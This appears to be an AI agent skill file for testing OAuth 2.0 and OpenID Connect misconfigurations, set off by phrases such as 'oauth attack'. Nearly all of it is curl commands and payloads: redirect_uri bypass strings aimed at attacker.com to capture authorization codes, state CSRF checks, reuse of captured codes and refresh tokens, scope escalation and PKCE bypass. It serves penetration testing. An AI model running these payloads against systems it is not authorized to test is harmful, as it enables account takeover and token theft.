---
name: vuln-oauth
description: "OAuth 2.0 and OpenID Connect misconfiguration testing. Open redirect ATO, state CSRF bypass, authorization code leakage and reuse, token audience confusion, PKCE bypass, scope escalation, implicit flow abuse. Triggers: 'oauth misconfig', 'oauth attack', 'oauth2 bypass', 'openid connect', 'redirect_uri bypass', 'oauth state csrf', 'pkce bypass', 'authorization code reuse', 'oauth token', 'sso bypass'."
---

# OAuth 2.0 / OpenID Connect Misconfiguration Testing

Open redirect ATO, state bypass, code leakage, scope escalation, PKCE bypass, token confusion.

---

## Phase 1: Reconnaissance

```bash
TARGET="https://TARGET"

curl -s "$TARGET/.well-known/openid-configuration" | jq .
curl -s "$TARGET/.well-known/oauth-authorization-server" | jq .
curl -s "$TARGET/oauth/.well-known/openid-configuration" | jq .

OIDC=$(curl -s "$TARGET/.well-known/openid-configuration")
AUTH_EP=$(echo $OIDC | jq -r '.authorization_endpoint')
TOKEN_EP=$(echo $OIDC | jq -r '.token_endpoint')
JWKS_URI=$(echo $OIDC | jq -r '.jwks_uri')
echo "Auth: $AUTH_EP | Token: $TOKEN_EP | JWKS: $JWKS_URI"

curl -s "$TARGET/" | grep -oE 'client_id["\s:=]+["\x27][a-zA-Z0-9_-]+["\x27]'
curl -s "$TARGET/static/app.js" | grep -oE '"client_id":"[^"]+"'
```

---

## Phase 2: Open Redirect → Account Takeover

```bash
AUTH_EP="https://auth.TARGET/oauth/authorize"
CLIENT_ID="known_client_id"

EVIL_1="https://allowed.TARGET.com/callback/../../../attacker.com"

EVIL_2="https://allowed.TARGET.com/callback?redirect=https://attacker.com"

EVIL_3="https://TARGET.com.attacker.com/callback"

EVIL_4="https://allowed.TARGET.com/callback#@attacker.com"

EVIL_5="https://app.TARGET.com/redirect?url=attacker.com"

for redirect in "$EVIL_1" "$EVIL_2" "$EVIL_3" "$EVIL_4" "$EVIL_5"; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$redirect")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=$encoded&response_type=code")
  echo "$STATUS → $redirect"
done
```

---

## Phase 3: State Parameter Bypass (CSRF on OAuth)

```bash

curl -s -L "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://app.TARGET.com/callback&response_type=code" \
  -w "%{redirect_url}" | grep code=

STATE_VAL="123"
curl -s "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://app.TARGET.com/callback&response_type=code&state=$STATE_VAL"

curl -s "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://app.TARGET.com/callback&response_type=code&state=$STATE_VAL"
# → If both return codes, state not properly validated
```

---

## Phase 4: Authorization Code Attacks

```bash
TOKEN_EP="https://auth.TARGET.com/oauth/token"
CODE="captured_auth_code"

for i in 1 2; do
  echo "=== Use $i ==="
  curl -s -X POST "$TOKEN_EP" \
    -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://app.TARGET.com/callback&client_id=$CLIENT_ID"
done
# → Second use should fail with "invalid_grant"

curl -s -X POST "https://app.TARGET.com/oauth/callback" \
  -d "code=attacker_code&state=valid_state"

curl -s "https://app.TARGET.com/dashboard" -H "Cookie: SESSION=valid" | \
  grep -oE 'code=[a-zA-Z0-9_-]+'
```

---

## Phase 5: Scope Escalation

```bash
curl -s "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://app.TARGET.com/callback&response_type=code&scope=openid+email+admin+write:all"

for scope in "admin" "write:*" "openid profile email phone address" "root" "superuser"; do
  echo "=== Testing scope: $scope ==="
  curl -s "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://app.TARGET.com/callback&response_type=code&scope=$scope" | grep -i "error\|denied\|invalid"
done
```

---

## Phase 6: PKCE Bypass

```bash
python3 -c "
import secrets, hashlib, base64
verifier = secrets.token_urlsafe(64)
challenge = base64.urlsafe_b64encode(
    hashlib.sha256(verifier.encode()).digest()
).rstrip(b'=').decode()
print('verifier:', verifier)
print('challenge:', challenge)
"

curl -s -X POST "$TOKEN_EP" \
  -d "grant_type=authorization_code&code=CODE&client_id=$CLIENT_ID&redirect_uri=https://app.TARGET.com/callback"
# → If token returned without code_verifier, PKCE not enforced

curl -s -X POST "$TOKEN_EP" \
  -d "grant_type=authorization_code&code=CODE&client_id=$CLIENT_ID&redirect_uri=https://app.TARGET.com/callback&code_verifier=wrong"
```

---

## Phase 7: Token Confusion Attacks

```bash
APP1_TOKEN="token_from_app1"
curl -s "https://app2.TARGET.com/api/user" \
  -H "Authorization: Bearer $APP1_TOKEN"

python3 -c "
import base64, json, sys
token = '$APP1_TOKEN'
parts = token.split('.')
payload = json.loads(base64.b64decode(parts[1] + '=='))
print(json.dumps(payload, indent=2))
"

curl -s "https://app.TARGET.com/api/profile" \
  -H "Authorization: Bearer EXPIRED_TOKEN"

REFRESH_TOKEN="captured_refresh_token"
for i in $(seq 1 5); do
  curl -s -X POST "$TOKEN_EP" \
    -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&client_id=$CLIENT_ID" | jq .access_token
done
```

---

## Priority Checklist

```
Priority 1: redirect_uri validation (path traversal, subdomain, wildcard)
Priority 2: state parameter (missing = CSRF; reusable = session fixation)
Priority 3: code reuse (should be single-use)
Priority 4: scope creep (try admin/write/* scopes)
Priority 5: PKCE enforcement on public clients
Priority 6: token audience (token for app1 shouldn't work on app2)
Priority 7: implicit flow (response_type=token → token in URL fragment)
```

---

## Output

Save to `.omop/engagement/vuln/oauth/`:
- `discovery.txt` — OAuth endpoints and client_id
- `redirect-bypass.txt` — working redirect_uri bypasses
- `scope-test.txt` — granted scopes vs. requested
- `token-analysis.json` — decoded JWT claims

## Next Phase

→ `vuln-jwt` for JWT-specific attacks
→ `pentest-report` for final report
